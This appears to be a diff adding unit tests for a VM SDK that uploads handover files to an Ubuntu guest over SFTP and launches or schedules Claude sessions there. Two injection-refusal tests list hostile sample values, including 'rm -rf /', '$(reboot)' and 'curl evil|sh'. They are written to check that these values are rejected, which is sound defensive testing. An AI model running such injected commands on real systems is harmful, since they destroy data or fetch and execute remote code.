@@ -6,6 +6,7 @@ Hermetic tests mock `vbox` and the SSH client, so they run on any box. The
 failed) when ubuntu_new is not up on 127.0.0.1:2222.
 """
 import os
+import socket
 import sys
 import unittest
 from pathlib import Path
@@ -698,6 +699,373 @@ class TestDriveClaude(unittest.TestCase):
             rc, out = vm.drive_claude("run something", cwd="~/vault")
         self.assertEqual(rc, 124)
         self.assertIn("Killed", out)
+
+
+class TestPushFile(unittest.TestCase):
+    def setUp(self):
+        import tempfile
+        self.tmp = tempfile.mkdtemp()
+        self.addCleanup(lambda: __import__("shutil").rmtree(self.tmp, ignore_errors=True))
+        self.local = Path(self.tmp) / "h.md"
+        self.local.write_text("# handover\n")
+
+    def _vm(self):
+        with mock.patch.dict(os.environ,
+                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
+            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
+                return vmsdk.VM("ubuntu_new")
+
+    class _FakeSFTP:
+        """Records putfo/posix_rename calls; can be told to raise mid-upload."""
+        def __init__(self, putfo_exc=None):
+            self.putfo_calls = []
+            self.rename_calls = []
+            self.closed = False
+            self._putfo_exc = putfo_exc
+        def putfo(self, fobj, remote):
+            if self._putfo_exc is not None:
+                raise self._putfo_exc
+            self.putfo_calls.append((fobj.read(), remote))
+        def posix_rename(self, src, dst):
+            self.rename_calls.append((src, dst))
+        def close(self):
+            self.closed = True
+
+    def _fake_client(self, sftp):
+        class _FakeClient:
+            def open_sftp(_self):
+                return sftp
+        return _FakeClient()
+
+    def test_happy_path_resolves_tilde_and_uploads_via_tmp_rename(self):
+        vm = self._vm()
+        sftp = self._FakeSFTP()
+        cmds = []
+        def fake_run(cmd, **kw):
+            cmds.append(cmd)
+            return (0, "/home/u/handover-inbox\n")
+        with mock.patch.object(vm, "run", side_effect=fake_run), \
+             mock.patch.object(vm, "ssh", return_value=self._fake_client(sftp)):
+            result = vm.push_file(str(self.local), "~/handover-inbox/h.md")
+        self.assertEqual(result, "/home/u/handover-inbox/h.md")
+        self.assertIn("mkdir -p ~/handover-inbox", cmds[0])
+        # Uploaded bytes match the local file, but land at a TEMP name first...
+        self.assertEqual(len(sftp.putfo_calls), 1)
+        uploaded_bytes, tmp_remote = sftp.putfo_calls[0]
+        self.assertEqual(uploaded_bytes, self.local.read_bytes())
+        self.assertNotEqual(tmp_remote, "/home/u/handover-inbox/h.md")
+        # ...then posix_rename'd into place: rename target = final path.
+        self.assertEqual(len(sftp.rename_calls), 1)
+        rename_src, rename_dst = sftp.rename_calls[0]
+        self.assertEqual(rename_src, tmp_remote)
+        self.assertEqual(rename_dst, "/home/u/handover-inbox/h.md")
+
+    def test_upload_failure_raises_vmerror_and_still_closes_sftp(self):
+        """A mid-putfo failure (e.g. a dropped connection) must surface as a
+        clean VMError, and the sftp handle must still be closed (finally)."""
+        vm = self._vm()
+        sftp = self._FakeSFTP(putfo_exc=OSError("connection reset"))
+        def fake_run(cmd, **kw):
+            return (0, "/home/u/handover-inbox\n")
+        with mock.patch.object(vm, "run", side_effect=fake_run), \
+             mock.patch.object(vm, "ssh", return_value=self._fake_client(sftp)):
+            with self.assertRaises(vmsdk.VMError):
+                vm.push_file(str(self.local), "~/handover-inbox/h.md")
+        self.assertTrue(sftp.closed)
+
+    def test_skip_if_exists_skips_upload_when_final_path_present(self):
+        """Same-digest retry (skip_if_exists=True): the final path already
+        exists on the guest -> no upload/rename happens at all, removing the
+        rewrite window on a file an already-armed job may be reading."""
+        vm = self._vm()
+        sftp = self._FakeSFTP()
+        run_calls = []
+        def fake_run(cmd, **kw):
+            run_calls.append(cmd)
+            if cmd.startswith("test -f"):
+                return (0, "")   # exists
+            return (0, "/home/u/handover-inbox\n")
+        with mock.patch.object(vm, "run", side_effect=fake_run), \
+             mock.patch.object(vm, "ssh", return_value=self._fake_client(sftp)):
+            result = vm.push_file(str(self.local), "~/handover-inbox/h.md",
+                                  data=b"content", skip_if_exists=True)
+        self.assertEqual(result, "/home/u/handover-inbox/h.md")
+        self.assertEqual(sftp.putfo_calls, [])
+        self.assertEqual(sftp.rename_calls, [])
+        self.assertTrue(any(c.startswith("test -f") for c in run_calls))
+
+    def test_skip_if_exists_uploads_when_final_path_absent(self):
+        vm = self._vm()
+        sftp = self._FakeSFTP()
+        def fake_run(cmd, **kw):
+            if cmd.startswith("test -f"):
+                return (1, "")   # absent
+            return (0, "/home/u/handover-inbox\n")
+        with mock.patch.object(vm, "run", side_effect=fake_run), \
+             mock.patch.object(vm, "ssh", return_value=self._fake_client(sftp)):
+            result = vm.push_file(str(self.local), "~/handover-inbox/h.md",
+                                  data=b"content", skip_if_exists=True)
+        self.assertEqual(result, "/home/u/handover-inbox/h.md")
+        self.assertEqual(len(sftp.putfo_calls), 1)
+        self.assertEqual(len(sftp.rename_calls), 1)
+
+    def test_missing_local_raises(self):
+        vm = self._vm()
+        with self.assertRaises(vmsdk.VMError):
+            vm.push_file(str(Path(self.tmp) / "absent.md"), "~/x/absent.md")
+
+    def test_env_basename_refused(self):
+        """VM creds + PAT live in .env — it must never be pushed to the guest."""
+        vm = self._vm()
+        envfile = Path(self.tmp) / ".env"
+        envfile.write_text("secret=1\n")
+        with self.assertRaises(vmsdk.VMError) as cm:
+            vm.push_file(str(envfile), "~/x/.env")
+        self.assertIn(".env", str(cm.exception))
+
+    def test_mkdir_failure_raises(self):
+        vm = self._vm()
+        with mock.patch.object(vm, "run", return_value=(1, "read-only fs")):
+            with self.assertRaises(vmsdk.VMError):
+                vm.push_file(str(self.local), "~/x/h.md")
+
+    def test_shell_metacharacters_in_remote_refused(self):
+        """remote is interpolated unquoted (guest ~ expansion) — charset-
+        validate so a crafted destination cannot inject guest commands."""
+        vm = self._vm()
+        for evil in ("~/x; rm -rf /", "~/x/$(reboot)", "~/x/`id`", "~/x/a b"):
+            with mock.patch.object(vm, "run") as r:
+                with self.assertRaises(vmsdk.VMError):
+                    vm.push_file(str(self.local), evil)
+                r.assert_not_called()  # refused BEFORE any guest command runs
+
+
+class TestTriggerClaude(unittest.TestCase):
+    def setUp(self):
+        import tempfile
+        self.tmp = tempfile.mkdtemp()
+        self.addCleanup(lambda: __import__("shutil").rmtree(self.tmp, ignore_errors=True))
+        self.local = Path(self.tmp) / "next-session-1.md"
+        self.local.write_text("# handover\n")
+
+    def _vm(self):
+        with mock.patch.dict(os.environ,
+                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
+            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
+                return vmsdk.VM("ubuntu_new")
+
+    def _expected_remote(self, local, inbox="~/handover-inbox"):
+        """Mirror trigger_claude's immutable collision-resistant inbox naming."""
+        import hashlib
+        src = Path(local).resolve()
+        tag = hashlib.sha1(str(src).encode()).hexdigest()[:8]
+        digest = hashlib.sha1(src.read_bytes()).hexdigest()[:8]
+        return f"{inbox}/{tag}-{digest}-{src.name}"
+
+    def test_immediate_drives_claude_with_guest_handover_path(self):
+        vm = self._vm()
+        guest = "/home/u/handover-inbox/next-session-1.md"
+        with mock.patch.object(vm, "push_file", return_value=guest) as pf, \
+             mock.patch.object(vm, "drive_claude", return_value=(0, "done")) as dc:
+            rc, out = vm.trigger_claude(str(self.local))
+        self.assertEqual((rc, out), (0, "done"))
+        pf.assert_called_once_with(str(self.local),
+                                   self._expected_remote(self.local),
+                                   data=self.local.read_bytes(), skip_if_exists=True)
+        prompt = dc.call_args[0][0]
+        self.assertIn(guest, prompt)
+        self.assertEqual(dc.call_args.kwargs.get("cwd"),
+                         "~/Documents/github/himmel-private")
+
+    def test_same_basename_different_sources_distinct_guest_paths(self):
+        """codex-adv CR: next-session-N.md exists in many buckets — two
+        different host handovers must never map to the same inbox path."""
+        vm = self._vm()
+        other_dir = Path(self.tmp) / "other-bucket"
+        other_dir.mkdir()
+        other = other_dir / self.local.name   # SAME basename, different source
+        other.write_text("# other handover\n")
+        remotes = []
+        def fake_push(local, remote, **kw):
+            remotes.append(remote)
+            return f"/home/u/{remote.lstrip('~/')}"
+        with mock.patch.object(vm, "push_file", side_effect=fake_push), \
+             mock.patch.object(vm, "drive_claude", return_value=(0, "ok")):
+            vm.trigger_claude(str(self.local))
+            vm.trigger_claude(str(other))
+        self.assertEqual(len(remotes), 2)
+        self.assertNotEqual(remotes[0], remotes[1])
+        for r in remotes:
+            self.assertTrue(r.endswith(f"-{self.local.name}"))
+
+    def test_edited_content_never_mutates_queued_delivery(self):
+        """codex-adv CR round 2: a retry with EDITED content must target a NEW
+        guest path — the file an already-armed job points at is immutable.
+        Same content retries hit the same path (idempotent, byte-identical)."""
+        vm = self._vm()
+        remotes = []
+        def fake_push(local, remote, **kw):
+            remotes.append(remote)
+            return f"/home/u/{remote.lstrip('~/')}"
+        with mock.patch.object(vm, "push_file", side_effect=fake_push), \
+             mock.patch.object(vm, "run", return_value=(0, "armed")):
+            vm.trigger_claude(str(self.local), when="22:30")
+            vm.trigger_claude(str(self.local), when="22:30")   # same content
+            self.local.write_text("# handover EDITED\n")
+            vm.trigger_claude(str(self.local), when="23:30")   # edited content
+        self.assertEqual(remotes[0], remotes[1])       # idempotent retry
+        self.assertNotEqual(remotes[0], remotes[2])    # edit -> new path
+
+    def test_immediate_passes_timeout_and_cwd(self):
+        vm = self._vm()
+        with mock.patch.object(vm, "push_file", return_value="/h/x.md"), \
+             mock.patch.object(vm, "drive_claude", return_value=(124, "Killed")) as dc:
+            rc, out = vm.trigger_claude(str(self.local), cwd="~/himmel", timeout=42)
+        self.assertEqual(rc, 124)  # timeout kill passes through, not raised
+        self.assertEqual(dc.call_args.kwargs.get("timeout"), 42)
+        self.assertEqual(dc.call_args.kwargs.get("cwd"), "~/himmel")
+
+    def test_scheduled_arms_via_guest_arm_resume(self):
+        vm = self._vm()
+        cmds = []
+        def fake_run(cmd, **kw):
+            cmds.append(cmd)
+            return (0, "armed")
+        with mock.patch.object(vm, "push_file",
+                               return_value="/home/u/handover-inbox/next-session-1.md"), \
+             mock.patch.object(vm, "run", side_effect=fake_run):
+            rc, out = vm.trigger_claude(str(self.local), when="22:30")
+        self.assertEqual(rc, 0)
+        joined = "\n".join(cmds)
+        self.assertIn("arm-resume.sh", joined)          # never a hand-rolled scheduler
+        self.assertIn("--time 22:30", joined)
+        self.assertIn("--handover /home/u/handover-inbox/next-session-1.md", joined)
+        # codex-adv CR: no --force — arm-resume's dedup/collision checks must
+        # stay live so a re-trigger cannot silently replace a pending job.
+        self.assertNotIn("--force", joined)
+
+    def test_scheduled_without_cwd_omits_cwd_flag(self):
+        """HIMMEL-835 CR finding 1: no explicit cwd -> --cwd must be ABSENT so
+        arm-resume.sh's own priority (--cwd > resume_cwd: frontmatter >
+        auto-detect) runs, instead of an implicit default silently overriding
+        resume_cwd: / hard-failing a resume_worktree: handover (--cwd and
+        --worktree are mutually exclusive in arm-resume.sh). The default
+        checkout is still used to LOCATE arm-resume.sh (a separate concern)."""
+        vm = self._vm()
+        cmds = []
+        def fake_run(cmd, **kw):
+            cmds.append(cmd)
+            return (0, "armed")
+        with mock.patch.object(vm, "push_file",
+                               return_value="/home/u/handover-inbox/next-session-1.md"), \
+             mock.patch.object(vm, "run", side_effect=fake_run):
+            vm.trigger_claude(str(self.local), when="22:30")
+        joined = "\n".join(cmds)
+        self.assertIn("cd ~/Documents/github/himmel-private", joined)
+        self.assertNotIn("--cwd", joined)
+
+    def test_scheduled_with_explicit_cwd_includes_cwd_flag(self):
+        vm = self._vm()
+        cmds = []
+        def fake_run(cmd, **kw):
+            cmds.append(cmd)
+            return (0, "armed")
+        with mock.patch.object(vm, "push_file",
+                               return_value="/home/u/handover-inbox/next-session-1.md"), \
+             mock.patch.object(vm, "run", side_effect=fake_run):
+            vm.trigger_claude(str(self.local), when="22:30", cwd="~/himmel")
+        joined = "\n".join(cmds)
+        self.assertIn("cd ~/himmel", joined)
+        self.assertIn("--cwd ~/himmel", joined)
+
+    def test_scheduled_arm_failure_raises(self):
+        vm = self._vm()
+        with mock.patch.object(vm, "push_file", return_value="/h/x.md"), \
+             mock.patch.object(vm, "run", return_value=(1, "at: no atd running")):
+            with self.assertRaises(vmsdk.VMError) as cm:
+                vm.trigger_claude(str(self.local), when="22:30")
+        self.assertIn("arm-resume", str(cm.exception))
+
+    def test_scheduled_arm_run_exception_wrapped_as_vmerror(self):
+        """HIMMEL-835 CR finding 4: a raw exception from self.run (e.g. a
+        socket timeout) during the arm-resume call must surface as a clean
+        VMError, not a raw traceback from the new CLI verb."""
+        vm = self._vm()
+        with mock.patch.object(vm, "push_file", return_value="/h/x.md"), \
+             mock.patch.object(vm, "run", side_effect=socket.timeout("timed out")):
+            with self.assertRaises(vmsdk.VMError):
+                vm.trigger_claude(str(self.local), when="22:30")
+
+    def test_missing_handover_raises_vmerror_not_raw_exception(self):
+        """HIMMEL-835 CR finding 3: Path(...).resolve() does not require
+        existence — the hoisted is_file() check must raise a clean VMError
+        before the digest read, not a raw FileNotFoundError, and push_file
+        must never be reached."""
+        vm = self._vm()
+        missing = str(Path(self.tmp) / "absent.md")
+        with mock.patch.object(vm, "push_file") as pf:
+            with self.assertRaises(vmsdk.VMError) as cm:
+                vm.trigger_claude(missing)
+            pf.assert_not_called()
+        self.assertIn("not found", str(cm.exception))
+
+    def test_shell_metacharacters_in_cwd_refused(self):
+        """cwd is interpolated unquoted into guest cd commands — charset-
+        validate so a crafted cwd cannot inject guest commands."""
+        vm = self._vm()
+        for evil in ("~/repo; curl evil|sh", "$(id)", "~/a b"):
+            with mock.patch.object(vm, "push_file") as pf, \
+                 mock.patch.object(vm, "run") as r:
+                with self.assertRaises(vmsdk.VMError):
+                    vm.trigger_claude(str(self.local), cwd=evil)
+                pf.assert_not_called()  # refused before the handover is pushed
+                r.assert_not_called()
+
+
+class TestTriggerCLI(unittest.TestCase):
+    def _env(self):
+        return mock.patch.dict(os.environ,
+                               {"ubuntu_vm_user": "u", "ubuntu_vm_pass": "p"}, clear=False)
+
+    def test_trigger_parses_at_cwd_timeout(self):
+        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"), \
+             mock.patch.object(vmsdk.VM, "trigger_claude",
+                               return_value=(0, "armed")) as t:
+            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md",
+                             "--at", "22:30", "--cwd", "~/himmel", "--timeout", "60"])
+        self.assertEqual(rc, 0)
+        t.assert_called_once_with("h.md", when="22:30", cwd="~/himmel", timeout=60)
+
+    def test_trigger_propagates_drive_rc(self):
+        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"), \
+             mock.patch.object(vmsdk.VM, "trigger_claude", return_value=(124, "Killed")):
+            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md"])
+        self.assertEqual(rc, 124)
+
+    def test_trigger_unknown_flag_exit_2(self):
+        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"):
+            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md", "--bogus", "x"])
+        self.assertEqual(rc, 2)
+
+    def test_trigger_missing_flag_value_exit_2(self):
+        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"):
+            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md", "--at"])
+        self.assertEqual(rc, 2)
+
+    def test_trigger_environment_error_exit_1(self):
+        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"), \
+             mock.patch.object(vmsdk.VM, "trigger_claude",
+                               side_effect=EnvironmentError("claude not found on guest")):
+            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md"])
+        self.assertEqual(rc, 1)
+
+    def test_push_prints_absolute_remote(self):
+        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"), \
+             mock.patch.object(vmsdk.VM, "push_file",
+                               return_value="/home/u/handover-inbox/h.md") as p:
+            rc = vmsdk.main(["ubuntu_new", "push", "h.md"])
+        self.assertEqual(rc, 0)
+        p.assert_called_once_with("h.md", "~/handover-inbox/h.md")
 
 
 def _ubuntu_up():
